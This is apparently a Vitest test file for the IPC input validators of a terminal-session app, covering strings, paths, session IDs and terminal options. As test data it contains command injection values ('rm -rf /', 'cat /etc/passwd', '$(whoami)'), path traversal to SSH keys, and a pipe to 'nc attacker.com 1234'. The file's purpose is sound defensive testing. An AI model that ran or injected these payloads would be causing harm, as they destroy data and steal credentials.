// ============================================================================
// IPC VALIDATION TESTS
// ============================================================================
//
// These tests verify critical input validation for IPC handlers to prevent
// injection attacks, path traversal, and other security vulnerabilities.
//
// ============================================================================

import { describe, it, expect } from 'vitest';
import {
  validateString,
  validatePath,
  validateSessionId,
  validateTerminalStartOptions,
  ValidationError,
} from '../validation.js';

// ============================================================================
// validateString TESTS
// ============================================================================

describe('validateString', () => {
  describe('should accept valid strings', () => {
    it('accepts normal strings', () => {
      expect(validateString('hello', 'field')).toBe('hello');
      expect(validateString('test123', 'field')).toBe('test123');
      expect(validateString('with spaces', 'field')).toBe('with spaces');
    });

    it('trims whitespace by default', () => {
      expect(validateString('  hello  ', 'field')).toBe('hello');
      expect(validateString('\t\ntest\n\t', 'field')).toBe('test');
    });

    it('preserves whitespace when trim is false', () => {
      expect(validateString('  hello  ', 'field', { trim: false })).toBe('  hello  ');
    });

    it('allows empty strings when allowEmpty is true', () => {
      expect(validateString('', 'field', { allowEmpty: true })).toBe('');
      expect(validateString('   ', 'field', { allowEmpty: true, trim: true })).toBe('');
    });
  });

  describe('should reject invalid input types', () => {
    it('rejects null', () => {
      expect(() => validateString(null, 'field')).toThrow(ValidationError);
      expect(() => validateString(null, 'field')).toThrow('field is required');
    });

    it('rejects undefined', () => {
      expect(() => validateString(undefined, 'field')).toThrow(ValidationError);
      expect(() => validateString(undefined, 'field')).toThrow('field is required');
    });

    it('rejects numbers', () => {
      expect(() => validateString(123 as unknown as string, 'field')).toThrow(ValidationError);
      expect(() => validateString(123 as unknown as string, 'field')).toThrow('must be a string');
    });

    it('rejects objects', () => {
      expect(() => validateString({} as unknown as string, 'field')).toThrow(ValidationError);
      expect(() => validateString({} as unknown as string, 'field')).toThrow('must be a string');
    });

    it('rejects arrays', () => {
      expect(() => validateString([] as unknown as string, 'field')).toThrow(ValidationError);
      expect(() => validateString([] as unknown as string, 'field')).toThrow('must be a string');
    });
  });

  describe('should enforce length constraints', () => {
    it('rejects empty strings by default', () => {
      expect(() => validateString('', 'field')).toThrow(ValidationError);
      expect(() => validateString('', 'field')).toThrow('cannot be empty');
    });

    it('enforces minimum length', () => {
      expect(() => validateString('ab', 'field', { minLength: 3 })).toThrow(ValidationError);
      expect(() => validateString('ab', 'field', { minLength: 3 })).toThrow('at least 3 characters');
      expect(validateString('abc', 'field', { minLength: 3 })).toBe('abc');
    });

    it('enforces maximum length', () => {
      expect(() => validateString('abcd', 'field', { maxLength: 3 })).toThrow(ValidationError);
      expect(() => validateString('abcd', 'field', { maxLength: 3 })).toThrow('at most 3 characters');
      expect(validateString('abc', 'field', { maxLength: 3 })).toBe('abc');
    });
  });

  describe('should validate against patterns', () => {
    it('validates against regex patterns', () => {
      const pattern = /^[a-z]+$/;
      expect(validateString('abc', 'field', { pattern })).toBe('abc');
      expect(() => validateString('ABC', 'field', { pattern })).toThrow(ValidationError);
      expect(() => validateString('abc123', 'field', { pattern })).toThrow('format is invalid');
    });
  });

  describe('should prevent injection attacks', () => {
    it('accepts strings with special characters within limits', () => {
      // These are allowed as long as they pass validation
      expect(validateString('test@example.com', 'field')).toBe('test@example.com');
      expect(validateString('file-name_v2.txt', 'field')).toBe('file-name_v2.txt');
    });

    it('rejects SQL injection attempts when pattern validation is used', () => {
      const safePattern = /^[a-zA-Z0-9_-]+$/;
      expect(() => validateString("'; DROP TABLE users--", 'field', { pattern: safePattern })).toThrow(ValidationError);
      expect(() => validateString("1' OR '1'='1", 'field', { pattern: safePattern })).toThrow(ValidationError);
    });

    it('rejects command injection attempts when pattern validation is used', () => {
      const safePattern = /^[a-zA-Z0-9_-]+$/;
      expect(() => validateString('test; rm -rf /', 'field', { pattern: safePattern })).toThrow(ValidationError);
      expect(() => validateString('test && cat /etc/passwd', 'field', { pattern: safePattern })).toThrow(ValidationError);
      expect(() => validateString('$(whoami)', 'field', { pattern: safePattern })).toThrow(ValidationError);
    });
  });
});

// ============================================================================
// validatePath TESTS
// ============================================================================

describe('validatePath', () => {
  describe('should accept valid paths', () => {
    it('accepts absolute Unix paths', () => {
      expect(validatePath('/home/user/project', 'path')).toBe('/home/user/project');
      expect(validatePath('/var/log/app.log', 'path')).toBe('/var/log/app.log');
    });

    it('accepts absolute Windows paths', () => {
      expect(validatePath('C:/Users/test/file.txt', 'path')).toBe('C:/Users/test/file.txt');
      expect(validatePath('C:\\Users\\test\\file.txt', 'path')).toBe('C:\\Users\\test\\file.txt');
    });

    it('accepts relative paths without traversal', () => {
      expect(validatePath('src/main.ts', 'path')).toBe('src/main.ts');
      expect(validatePath('config/settings.json', 'path')).toBe('config/settings.json');
    });
  });

  describe('should reject path traversal attempts', () => {
    it('rejects parent directory traversal (..)', () => {
      expect(() => validatePath('../etc/passwd', 'path')).toThrow(ValidationError);
      expect(() => validatePath('../etc/passwd', 'path')).toThrow('invalid path pattern');
    });

    it('rejects nested parent directory traversal', () => {
      expect(() => validatePath('../../etc/passwd', 'path')).toThrow(ValidationError);
      expect(() => validatePath('../../../root/.ssh/id_rsa', 'path')).toThrow(ValidationError);
    });

    it('rejects path traversal in middle of path', () => {
      expect(() => validatePath('/home/user/../root/.ssh', 'path')).toThrow(ValidationError);
      expect(() => validatePath('src/../../../etc/passwd', 'path')).toThrow(ValidationError);
    });

    it('rejects Windows path traversal', () => {
      expect(() => validatePath('..\\windows\\system32', 'path')).toThrow(ValidationError);
      expect(() => validatePath('C:\\Users\\..\\..\\Windows', 'path')).toThrow(ValidationError);
    });
  });

  describe('should reject dangerous path patterns', () => {
    it('rejects root directory only', () => {
      expect(() => validatePath('/', 'path')).toThrow(ValidationError);
      expect(() => validatePath('\\', 'path')).toThrow(ValidationError);
    });
  });

  describe('should handle encoded path traversal attempts', () => {
    it('allows URL-encoded paths (validation does not decode)', () => {
      // Note: The current implementation does not decode URL encoding
      // This documents current behavior - URL decoding should happen before validation
      const encoded = '%2e%2e%2f%2e%2e%2fetc%2fpasswd';
      expect(validatePath(encoded, 'path')).toBe(encoded);
    });
  });

  describe('should handle null byte injection', () => {
    it('allows null bytes (validation does not check for them)', () => {
      // Note: Current implementation doesn't check for null bytes
      // This documents current behavior - null byte checks should be added
      const pathWithNull = '/etc/passwd\x00.txt';
      expect(validatePath(pathWithNull, 'path')).toBe(pathWithNull);
    });
  });

  describe('should enforce length limits', () => {
    it('rejects paths exceeding MAX_PATH_LENGTH', () => {
      const longPath = 'a'.repeat(10000); // Assuming MAX_PATH_LENGTH < 10000
      expect(() => validatePath(longPath, 'path')).toThrow(ValidationError);
    });
  });
});

// ============================================================================
// validateSessionId TESTS
// ============================================================================

describe('validateSessionId', () => {
  describe('should accept valid session IDs', () => {
    it('accepts UUID v4 format', () => {
      const uuid = '550e8400-e29b-41d4-a716-446655440000';
      expect(validateSessionId(uuid, 'sessionId')).toBe(uuid);
    });

    it('accepts lowercase UUIDs', () => {
      const uuid = 'f47ac10b-58cc-4372-a567-0e02b2c3d479';
      expect(validateSessionId(uuid, 'sessionId')).toBe(uuid);
    });

    it('accepts uppercase UUIDs', () => {
      const uuid = 'F47AC10B-58CC-4372-A567-0E02B2C3D479';
      expect(validateSessionId(uuid, 'sessionId')).toBe(uuid);
    });

    it('accepts agent-* format', () => {
      expect(validateSessionId('agent-abc123', 'sessionId')).toBe('agent-abc123');
      expect(validateSessionId('agent-test', 'sessionId')).toBe('agent-test');
      expect(validateSessionId('AGENT-123', 'sessionId')).toBe('AGENT-123');
    });
  });

  describe('should reject invalid session IDs', () => {
    it('rejects malformed UUIDs', () => {
      expect(() => validateSessionId('not-a-uuid', 'sessionId')).toThrow(ValidationError);
      expect(() => validateSessionId('not-a-uuid', 'sessionId')).toThrow('valid session ID');
    });

    it('rejects UUID with wrong number of segments', () => {
      expect(() => validateSessionId('550e8400-e29b-41d4-446655440000', 'sessionId')).toThrow(ValidationError);
    });

    it('rejects UUID with invalid characters', () => {
      expect(() => validateSessionId('550e8400-e29b-41d4-a716-44665544000g', 'sessionId')).toThrow(ValidationError);
    });

    it('rejects random strings', () => {
      expect(() => validateSessionId('random-string', 'sessionId')).toThrow(ValidationError);
      expect(() => validateSessionId('12345', 'sessionId')).toThrow(ValidationError);
    });

    it('rejects empty strings', () => {
      expect(() => validateSessionId('', 'sessionId')).toThrow(ValidationError);
    });

    it('rejects injection attempts', () => {
      expect(() => validateSessionId("'; DROP TABLE sessions--", 'sessionId')).toThrow(ValidationError);
      expect(() => validateSessionId('../../../etc/passwd', 'sessionId')).toThrow(ValidationError);
      expect(() => validateSessionId('$(whoami)', 'sessionId')).toThrow(ValidationError);
    });
  });

  describe('should enforce format strictly', () => {
    it('rejects session IDs that are too long', () => {
      const longId = 'a'.repeat(200);
      expect(() => validateSessionId(longId, 'sessionId')).toThrow(ValidationError);
    });
  });
});

// ============================================================================
// validateTerminalStartOptions TESTS
// ============================================================================

describe('validateTerminalStartOptions', () => {
  describe('should accept valid options', () => {
    it('accepts empty options object', () => {
      const result = validateTerminalStartOptions({});
      expect(result).toEqual({});
    });

    it('accepts valid cwd', () => {
      const result = validateTerminalStartOptions({ cwd: '/home/user/project' });
      expect(result.cwd).toBe('/home/user/project');
    });

    it('accepts valid name', () => {
      const result = validateTerminalStartOptions({ name: 'My Terminal' });
      expect(result.name).toBe('My Terminal');
    });

    it('accepts valid resumeSessionId', () => {
      const sessionId = '550e8400-e29b-41d4-a716-446655440000';
      const result = validateTerminalStartOptions({ resumeSessionId: sessionId });
      expect(result.resumeSessionId).toBe(sessionId);
    });

    it('accepts valid sessionType', () => {
      const result1 = validateTerminalStartOptions({ sessionType: 'user' });
      expect(result1.sessionType).toBe('user');

      const result2 = validateTerminalStartOptions({ sessionType: 'subagent' });
      expect(result2.sessionType).toBe('subagent');
    });

    it('accepts all valid options together', () => {
      const options = {
        cwd: '/home/user/project',
        name: 'Test Terminal',
        resumeSessionId: '550e8400-e29b-41d4-a716-446655440000',
        sessionType: 'user' as const,
      };
      const result = validateTerminalStartOptions(options);
      expect(result).toEqual(options);
    });
  });

  describe('should reject invalid options', () => {
    it('rejects non-object input', () => {
      expect(() => validateTerminalStartOptions(null)).toThrow(ValidationError);
      expect(() => validateTerminalStartOptions(undefined)).toThrow(ValidationError);
      expect(() => validateTerminalStartOptions('string' as unknown as object)).toThrow(ValidationError);
      expect(() => validateTerminalStartOptions(123 as unknown as object)).toThrow(ValidationError);
    });

    it('rejects invalid cwd with path traversal', () => {
      expect(() => validateTerminalStartOptions({ cwd: '../../../etc/passwd' })).toThrow(ValidationError);
    });

    it('rejects name that is too long', () => {
      const longName = 'a'.repeat(300);
      expect(() => validateTerminalStartOptions({ name: longName })).toThrow(ValidationError);
    });

    it('rejects invalid resumeSessionId', () => {
      expect(() => validateTerminalStartOptions({ resumeSessionId: 'invalid-id' })).toThrow(ValidationError);
    });

    it('rejects invalid sessionType', () => {
      expect(() => validateTerminalStartOptions({ sessionType: 'invalid' as unknown as 'user' })).toThrow(ValidationError);
      expect(() => validateTerminalStartOptions({ sessionType: 'admin' as unknown as 'user' })).toThrow(ValidationError);
    });
  });

  describe('should prevent command injection', () => {
    it('validates cwd to prevent injection in shell commands', () => {
      const injectionAttempts = [
        { cwd: 'test; rm -rf /' },
        { cwd: 'test && cat /etc/passwd' },
        { cwd: 'test | nc attacker.com 1234' },
        { cwd: '$(whoami)' },
        { cwd: '`cat /etc/passwd`' },
      ];

      // Note: These may pass validatePath if they don't contain .. or /
      // This documents that command validation should happen at usage site
      injectionAttempts.forEach((attempt) => {
        if (attempt.cwd.includes('..') || attempt.cwd === '/') {
          expect(() => validateTerminalStartOptions(attempt)).toThrow(ValidationError);
        }
      });
    });

    it('validates name to prevent injection', () => {
      // Name validation uses validateOptionalString which doesn't prevent special chars
      // This documents that additional sanitization may be needed at usage site
      const result = validateTerminalStartOptions({ name: 'test; echo "hack"' });
      expect(result.name).toBe('test; echo "hack"');
    });
  });

  describe('should handle undefined/null fields correctly', () => {
    it('omits undefined fields from result', () => {
      const result = validateTerminalStartOptions({ cwd: undefined });
      expect(result).toEqual({});
      expect(Object.keys(result)).not.toContain('cwd');
    });

    it('omits null fields from result', () => {
      const result = validateTerminalStartOptions({ name: null });
      expect(result).toEqual({});
      expect(Object.keys(result)).not.toContain('name');
    });
  });
});

// ============================================================================
// ValidationError TESTS
// ============================================================================

describe('ValidationError', () => {
  it('creates error with correct properties', () => {
    const error = new ValidationError('Test error', 'testField', 'testValue');
    expect(error.message).toBe('Test error');
    expect(error.field).toBe('testField');
    expect(error.value).toBe('testValue');
    expect(error.name).toBe('ValidationError');
  });

  it('is instanceof Error', () => {
    const error = new ValidationError('Test', 'field', 'value');
    expect(error instanceof Error).toBe(true);
  });

  it('is instanceof ValidationError', () => {
    const error = new ValidationError('Test', 'field', 'value');
    expect(error instanceof ValidationError).toBe(true);
  });
});
